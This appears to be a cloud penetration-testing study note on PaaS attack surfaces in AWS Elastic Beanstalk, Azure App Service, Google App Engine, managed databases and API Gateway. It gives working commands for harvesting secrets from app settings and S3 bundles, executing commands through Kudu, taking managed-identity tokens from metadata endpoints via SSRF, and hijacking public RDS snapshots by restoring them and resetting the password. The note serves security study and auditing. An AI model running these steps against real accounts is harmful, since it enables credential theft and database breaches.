# 05.4 — PaaS Attack Surface

## What This Note Covers

Platform-as-a-Service attack surfaces across AWS, Azure, and GCP. Covers Elastic Beanstalk, Azure App Service, Google App Engine, managed database services (RDS, Cosmos DB, Cloud SQL), and API Gateway attacks.

---

## AWS Elastic Beanstalk

Elastic Beanstalk (EB) is AWS's PaaS for deploying web applications. It provisions EC2 instances, load balancers, and Auto Scaling automatically — but the customer manages the application and its configuration.

### Attack Surface

```bash
# List all Elastic Beanstalk applications
aws elasticbeanstalk describe-applications

# List environments (each environment = running deployment)
aws elasticbeanstalk describe-environments

# Get environment configuration (may contain secrets in env vars)
aws elasticbeanstalk describe-configuration-settings \
  --application-name APP_NAME \
  --environment-name ENV_NAME

# Look for: aws:elasticbeanstalk:application:environment namespace
# This contains all environment variables set for the application
# Common finds: DATABASE_URL with creds, API keys, secrets

# Check EB configuration files (.ebextensions)
# These are stored in S3 and contain app configuration
aws s3 ls s3://elasticbeanstalk-REGION-ACCOUNT_ID/ --recursive
aws s3 cp s3://elasticbeanstalk-REGION-ACCOUNT_ID/.ebextensions/ . --recursive
```

### S3 Bucket for EB

Every Elastic Beanstalk environment uses an S3 bucket named `elasticbeanstalk-REGION-ACCOUNT_ID`. This bucket:
- Stores application source bundles (ZIP files)
- Stores logs
- May contain `.ebextensions` configuration files with credentials

```bash
# Find the EB S3 bucket
aws s3 ls | grep elasticbeanstalk

# List and download application bundles
aws s3 ls s3://elasticbeanstalk-us-east-1-123456789012/ --recursive
aws s3 sync s3://elasticbeanstalk-us-east-1-123456789012/ ./eb-bucket/

# Extract application bundles and search for secrets
find ./eb-bucket -name "*.zip" -exec unzip {} -d ./extracted/ \;
grep -r "password\|secret\|api_key\|DATABASE_URL" ./extracted/
```

### EB IAM Instance Profile

EB instances have an IAM instance profile (`aws-elasticbeanstalk-ec2-role` by default). If this role has broad permissions:

```bash
# Check what the default EB instance role can do
aws iam list-attached-role-policies \
  --role-name aws-elasticbeanstalk-ec2-role

# The metadata service on EB instances exposes this role's temp credentials
# SSRF → http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanstalk-ec2-role
```

## Azure App Service

Azure App Service is Azure's PaaS for web applications. Runs on Windows or Linux, supports multiple runtimes.

### Attack Surface

```bash
# List all App Service apps in subscription
az webapp list --output table

# Get app settings (environment variables — where secrets live)
az webapp config appsettings list \
  --name APP_NAME \
  --resource-group RG_NAME

# Common findings in App Service settings:
# SQLAZURECONNSTR_DefaultConnection → DB connection string with credentials
# AzureWebJobsStorage → Storage account connection string (with account key)
# WEBSITE_AUTH_CLIENT_SECRET → OAuth client secret
# Custom keys: DB_PASSWORD, API_KEY, etc.

# Get connection strings specifically
az webapp config connection-string list \
  --name APP_NAME \
  --resource-group RG_NAME

# Get deployment credentials (FTP/FTPS + Kudu)
az webapp deployment list-publishing-credentials \
  --name APP_NAME \
  --resource-group RG_NAME
```

### Kudu — App Service Management Console

Every App Service has a **Kudu** management endpoint at `https://APP_NAME.scm.azurewebsites.net`. Kudu provides:
- Remote shell access (Kudu console)
- File system explorer
- Log streaming
- Deployment management

```bash
# Kudu endpoints (if authenticated):
https://APP_NAME.scm.azurewebsites.net/api/command  # execute commands
https://APP_NAME.scm.azurewebsites.net/api/vfs/     # virtual filesystem
https://APP_NAME.scm.azurewebsites.net/DebugConsole  # interactive shell

# Execute a command via Kudu API (requires deployment credentials)
KUDU_USER=$(az webapp deployment list-publishing-credentials \
  --name APP_NAME --resource-group RG --query publishingUserName -o tsv)
KUDU_PASS=$(az webapp deployment list-publishing-credentials \
  --name APP_NAME --resource-group RG --query publishingPassword -o tsv)

curl -X POST \
  "https://APP_NAME.scm.azurewebsites.net/api/command" \
  -u "$KUDU_USER:$KUDU_PASS" \
  -H "Content-Type: application/json" \
  -d '{"command": "env", "dir": "/"}'
# Returns all environment variables including app settings (secrets)
```

### App Service Managed Identity

```bash
# Check if the App Service has a managed identity
az webapp show \
  --name APP_NAME \
  --resource-group RG \
  --query "identity"

# From inside the app (or via SSRF against the app):
# Steal the managed identity token via Azure IMDS
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

## Google App Engine

Google App Engine (GAE) is GCP's original PaaS. Standard environment (fully managed runtime) and Flexible environment (custom containers on Compute Engine).

### Attack Surface

```bash
# List App Engine services
gcloud app services list --project PROJECT_ID

# List versions of a service
gcloud app versions list --service SERVICE_NAME --project PROJECT_ID

# Get App Engine application details
gcloud app describe --project PROJECT_ID

# App Engine default service account:
# PROJECT_ID@appspot.gserviceaccount.com
# Default role: roles/editor — critical if not changed

# Check the default SA's permissions
gcloud projects get-iam-policy PROJECT_ID \
  --flatten="bindings[].members" \
  --filter="bindings.members:@appspot.gserviceaccount.com" \
  --format="table(bindings.role)"
```

### Metadata Service from App Engine

```bash
# From inside a GAE Flexible environment (or via SSRF):
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# GAE Standard environment: uses App Identity API internally
# but metadata service may also be accessible depending on version
```

## Managed Database Attack Surface

### AWS RDS / Aurora

```bash
# List all RDS instances
aws rds describe-db-instances \
  --query 'DBInstances[].{ID:DBInstanceIdentifier,Engine:Engine,Public:PubliclyAccessible,Endpoint:Endpoint.Address}'

# Critical: publicly accessible RDS instances
aws rds describe-db-instances \
  --query 'DBInstances[?PubliclyAccessible==`true`].{ID:DBInstanceIdentifier,Endpoint:Endpoint.Address,Port:Endpoint.Port}'

# If publicly accessible — attempt connection (using credentials from env vars / Secrets Manager)
mysql -h ENDPOINT -u admin -p -P 3306
psql -h ENDPOINT -U postgres -p 5432

# RDS Snapshots — may be shared publicly or with external accounts
aws rds describe-db-snapshots --include-public \
  --query 'DBSnapshots[?Public==`true`]'

# Restore a public snapshot to your own account (if found)
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier attacker-restored \
  --db-snapshot-identifier arn:aws:rds:us-east-1:VICTIM_ACCOUNT:snapshot:rds:TARGET-SNAPSHOT

# Then reset the master password
aws rds modify-db-instance \
  --db-instance-identifier attacker-restored \
  --master-user-password NewPassword123!
  --apply-immediately
```

> [!danger] Public RDS snapshots = full database access
> A shared RDS snapshot can be restored to an attacker's account. The attacker resets the master password and gains full access to all data in the database. This is a critical misconfiguration and real-world breach path.

### Azure Cosmos DB

```bash
# List Cosmos DB accounts
az cosmosdb list --output table

# Get connection strings (includes master key — full access)
az cosmosdb keys list \
  --name COSMOS_ACCOUNT \
  --resource-group RG \
  --type connection-strings

# Get account keys directly
az cosmosdb keys list \
  --name COSMOS_ACCOUNT \
  --resource-group RG

# Primary master key = read/write access to ALL databases in the account
# Use with Azure Cosmos DB SDK or REST API

# Check if public network access is enabled (no firewall)
az cosmosdb show \
  --name COSMOS_ACCOUNT \
  --resource-group RG \
  --query "publicNetworkAccess"
# "Enabled" = accessible from internet (with key)
```

### GCP Cloud SQL

```bash
# List Cloud SQL instances
gcloud sql instances list --project PROJECT_ID

# Check if public IP is assigned (accessible from internet)
gcloud sql instances describe INSTANCE_NAME \
  --project PROJECT_ID \
  --format="get(ipAddresses)"

# Check authorised networks (IP allowlist)
gcloud sql instances describe INSTANCE_NAME \
  --project PROJECT_ID \
  --format="get(settings.ipConfiguration.authorizedNetworks)"
# If 0.0.0.0/0 is in the list → accessible from anywhere

# Get connection info (for Cloud SQL Proxy)
gcloud sql instances describe INSTANCE_NAME \
  --format="get(connectionName)"
# Format: PROJECT_ID:REGION:INSTANCE_NAME

# Connect via Cloud SQL Proxy (requires cloudsql.instances.connect IAM permission)
cloud_sql_proxy -instances=PROJECT_ID:REGION:INSTANCE=tcp:5432
psql -h 127.0.0.1 -U postgres -p 5432
```

## API Gateway Attacks

### AWS API Gateway

```bash
# List all APIs
aws apigateway get-rest-apis --region REGION
aws apigatewayv2 get-apis --region REGION  # HTTP and WebSocket APIs

# Get API details including stages and endpoints
aws apigateway get-stages \
  --rest-api-id API_ID \
  --region REGION

# Get resource methods (endpoints exposed)
aws apigateway get-resources \
  --rest-api-id API_ID \
  --region REGION

# API endpoint pattern:
# https://API_ID.execute-api.REGION.amazonaws.com/STAGE/RESOURCE
```

**Common API Gateway misconfigurations:**
- Missing authentication on sensitive endpoints (`authorization: NONE`)
- Resource policies allowing all principals
- No throttling/rate limiting (DoS risk)
- WAF not attached
- API keys not rotated

```bash
# Check API resource methods for authentication
aws apigateway get-method \
  --rest-api-id API_ID \
  --resource-id RESOURCE_ID \
  --http-method GET \
  --query 'authorizationType'
# "NONE" → no authentication required

# Find endpoints with no auth
aws apigateway get-resources --rest-api-id API_ID --region REGION \
  --query 'items[].[id,path]' --output text | while read id path; do
    for method in GET POST PUT DELETE; do
      auth=$(aws apigateway get-method \
        --rest-api-id API_ID --resource-id $id \
        --http-method $method \
        --query 'authorizationType' \
        --output text 2>/dev/null)
      [ "$auth" = "NONE" ] && echo "NO AUTH: $method $path"
    done
  done
```
